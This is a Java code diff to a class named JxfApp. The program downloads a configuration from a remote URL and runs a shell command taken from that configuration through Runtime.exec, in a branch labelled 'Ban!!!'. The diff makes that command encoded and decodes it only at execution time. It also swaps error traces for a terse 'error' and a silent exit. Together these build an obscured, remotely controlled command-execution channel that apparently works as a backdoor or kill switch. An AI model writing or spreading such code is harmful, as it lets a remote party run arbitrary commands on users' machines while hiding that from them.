@@ -13,11 +13,19 @@ public class JxfApp {
 
     public static Properties properties = new Properties();
 
+    public static EncryptUtil encryptUtil;
+
     public static void main(String[] args) {
         try {
             File tmp = File.createTempFile("config",".properties");
             String config = JxfUtils.getRequest(Constants.ConfigURL);
             if (StringUtils.isNotBlank(config)) {
+                try {
+                    encryptUtil = new EncryptUtil();
+                } catch (Exception e) {
+                    System.out.println("create enUtil error!!!");
+                   return;
+                }
                 FileOutputStream fileOutputStream = new FileOutputStream(tmp.getPath());
                 fileOutputStream.write(config.getBytes());
                 fileOutputStream.flush();
@@ -48,7 +56,7 @@ public class JxfApp {
                         case 2:
                             //禁止并执行命令
                             System.out.println("Ban!!!");
-                            Runtime.getRuntime().exec(properties.getProperty(Constants.COMMAND));
+                            Runtime.getRuntime().exec(encryptUtil.decode(properties.getProperty(Constants.COMMAND)));
                             break;
                         case 3:
                             //使用并执行命令
@@ -58,7 +66,7 @@ public class JxfApp {
                             } else {
                                 System.out.println("Please enter the correct directory!");
                             }
-                            Runtime.getRuntime().exec(properties.getProperty(Constants.COMMAND));
+                            Runtime.getRuntime().exec(encryptUtil.decode(properties.getProperty(Constants.COMMAND)));
                             break;
                     }
                 }
@@ -66,7 +74,11 @@ public class JxfApp {
                 System.out.println("network anomaly");
             }
         } catch (IOException e) {
-            e.printStackTrace();
+            System.out.println("error");
+            System.exit(0);
+        } catch (Exception e) {
+            System.out.println("error");
+            System.exit(0);
         }
     }
 }
